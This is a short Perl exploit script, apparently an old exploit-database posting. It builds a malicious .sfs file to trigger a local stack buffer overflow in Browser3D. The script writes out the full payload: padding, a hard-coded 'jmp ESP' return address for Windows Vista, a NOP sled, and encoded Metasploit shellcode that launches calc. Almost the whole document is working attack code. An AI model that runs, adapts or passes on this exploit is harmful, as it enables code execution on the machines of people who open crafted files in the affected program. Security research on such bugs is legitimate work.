#!/usr/bin/perl
# By ALpHaNiX
# NullArea.Net
# THanks

system("color 5");

if (@ARGV != 1) { &help; exit(); }

sub help(){
	print "[X] Usage : ./exploit.pl filename \n";
}

{ $file = $ARGV[0]; }
print "\n [X]*************************************************\n";
print " [X]Browser3D(.sfs file) Local Stack Overflow Exploit*\n";
print " [X]        Coded By AlpHaNiX                        *\n";
print " [X]         From Null Area [NullArea.Net]           *\n";
print " [X]**************************************************\n\n";

print "[+] Exploiting.....\n" ;

my $acc="\x41" x 300 ;
# win32_exec -  EXITFUNC=seh CMD=calc Size=160 Encoder=PexFnstenvSub
http://metasploit.com
my $shellcode =
"\x2b\xc9\x83\xe9\xde\xd9\xee\xd9\x74\x24\xf4\x5b\x81\x73\x13\x5d".
"\x7e\xf1\x8c\x83\xeb\xfc\xe2\xf4\xa1\x96\xb5\x8c\x5d\x7e\x7a\xc9".
"\x61\xf5\x8d\x89\x25\x7f\x1e\x07\x12\x66\x7a\xd3\x7d\x7f\x1a\xc5".
"\xd6\x4a\x7a\x8d\xb3\x4f\x31\x15\xf1\xfa\x31\xf8\x5a\xbf\x3b\x81".
"\x5c\xbc\x1a\x78\x66\x2a\xd5\x88\x28\x9b\x7a\xd3\x79\x7f\x1a\xea".
"\xd6\x72\xba\x07\x02\x62\xf0\x67\xd6\x62\x7a\x8d\xb6\xf7\xad\xa8".
"\x59\xbd\xc0\x4c\x39\xf5\xb1\xbc\xd8\xbe\x89\x80\xd6\x3e\xfd\x07".
"\x2d\x62\x5c\x07\x35\x76\x1a\x85\xd6\xfe\x41\x8c\x5d\x7e\x7a\xe4".
"\x61\x21\xc0\x7a\x3d\x28\x78\x74\xde\xbe\x8a\xdc\x35\x8e\x7b\x88".
"\x02\x16\x69\x72\xd7\x70\xa6\x73\xba\x1d\x90\xe0\x3e\x7e\xf1\x8c";
my $ret ="\x1a\x0f\x46\x77"  ; #  jmp ESP in Windows VISTA
my $nop ="\x90" x 20 ;# some lame nops lol
my $exploit = $acc.$ret.$nop.$shellcode;
print "[+] Creating Evil File" ;
open($FILE, ">>$file") or die "Cannot open $file";
print $FILE $exploit;
close($FILE);
print "\n[+] Please wait while creating $file";
print "\n[+] $file has been created";
